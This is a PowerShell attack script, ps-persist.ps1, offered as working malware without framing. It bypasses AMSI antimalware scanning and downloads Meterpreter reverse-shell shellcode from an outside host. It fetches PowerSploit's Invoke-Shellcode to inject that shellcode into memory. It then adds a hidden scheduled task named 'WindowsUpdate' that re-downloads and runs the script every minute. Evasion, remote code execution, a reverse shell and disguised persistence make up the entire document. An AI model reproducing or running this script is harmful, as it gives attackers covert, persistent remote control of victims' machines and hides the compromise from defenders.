# --- PowerShell script: ps-persist.ps1 ---

# Bypass AMSI (basic)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Download & inject shellcode (Meterpreter reverse_tcp)
$sc = (New-Object Net.WebClient).DownloadData('http://engineering-ebay.gl.at.ply.gg/shellcode.b64')
$buf = [System.Convert]::FromBase64String($sc)

# Download Invoke-Shellcode from PowerSploit
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')

# Inject Meterpreter in memory
Invoke-Shellcode -Shellcode $buf -Force

# Create scheduled task to reinfect every minute
$task = "powershell.exe -w hidden -nologo -nop -c IEX((New-Object Net.WebClient).DownloadString('http://engineering-ebay.gl.at.ply.gg/ps-persist.ps1'))"
schtasks /create /sc minute /mo 1 /tn "WindowsUpdate" /tr "$task" /f >$null
